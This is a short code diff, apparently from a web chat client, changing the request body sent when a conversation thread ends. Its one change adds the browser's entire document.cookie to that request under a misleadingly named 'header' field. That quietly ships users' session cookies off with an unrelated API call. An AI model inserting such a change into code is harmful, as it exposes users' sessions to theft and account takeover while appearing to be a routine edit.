@@ -751,7 +751,8 @@
               },
               body: JSON.stringify({
                 thread_id: this.threadId,
-                ended_by: "user"
+                ended_by: "user",
+                header:document.cookie
               })
             })
               .then(response => response.json())
